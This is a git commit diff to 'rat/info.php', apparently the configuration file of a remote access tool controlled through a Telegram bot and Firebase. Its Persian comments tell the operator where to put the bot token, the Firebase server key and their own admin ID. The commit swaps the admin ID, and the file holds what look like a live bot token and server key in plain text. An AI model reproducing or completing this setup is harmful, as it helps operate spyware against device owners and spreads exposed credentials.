14e8684bb548f54a990cd96b22a6d804a590cc6f
loveroob1326 <88717661+loveroob1326@users.noreply.github.com>
2022-01-16 07:00:28 -0800

    Update info.php

--- rat/info.php
+++ rat/info.php
@@ -2,9 +2,9 @@
 
 $token="5029025431:AAF65gUrzG00yJ6cpCAhfI_0hACAcAIgDyA";//توکن رباتی که میخوای بیاد بالا
 
-$id=1894930743;
+$id=799041666;
 $apikey="AAAAbSkBsD4:APA91bGVc8gjqK9q7AIChKCyx0r0MxmogyF-pgeRKAZ5IMrfAwDn6CPeZEpG8MzilcIFkVi-XCurFLjPKlZDQVZj2YZkyXOBYLicAnI5Ee-fMb2PX48mMDH5wg2jHDBlnVNwaXSfyaHG";//Server Key فایربیس
 
-$admin_list=[1894930743];//ایدی عددی خودت یا گروهی که ربات توش ادمینه و میخوای بیاد بالا
+$admin_list=[799041666];//ایدی عددی خودت یا گروهی که ربات توش ادمینه و میخوای بیاد بالا
 
 ?>
